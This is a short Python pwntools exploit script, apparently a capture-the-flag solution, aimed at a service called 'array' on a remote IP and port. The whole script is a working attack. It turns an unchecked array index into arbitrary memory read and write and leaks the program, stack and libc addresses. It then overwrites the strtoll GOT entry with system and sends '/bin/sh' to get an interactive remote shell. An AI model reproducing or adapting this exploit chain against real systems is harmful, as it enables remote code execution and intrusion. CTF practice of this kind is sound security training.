from pwn import *

elf = ELF("array")
libc = ELF("libc.so.6") #after libc search and pwninit
buffer_addr = 0

p = remote('34.124.157.94' , 10546)
def read_buf(idx):
	p.recvuntil("?: ")
	p.sendline("R")
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Value: ")
	res = p.recvline()[:-1]
	return int(res)

def write_buf(idx, val):
	p.recvuntil("?: ")
	p.sendline("W")
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Value: ")
	p.sendline(str(val))

def arb_read(addr):
	return read_buf((addr - buffer_addr) // 8) #since read_buf will read from buffer_addr + 8*input, if input = (addr - buffer)/8_addr it will read from addr.

def arb_write(addr, what):
	return write_buf((addr - buffer_addr) // 8, what) 

elf.address = read_buf(-1) - 0x11f5
print(hex(elf.address))

stack = read_buf(-7)

buffer_addr = stack - 0x320


libc.address = arb_read(elf.got['puts']) - libc.sym.puts

arb_write(elf.got['strtoll'], libc.sym.system) #got overwrite

p.recvuntil("?: ")
p.sendline("R")
p.recvuntil("Index: ")
p.sendline('/bin/sh\x00')

p.interactive()
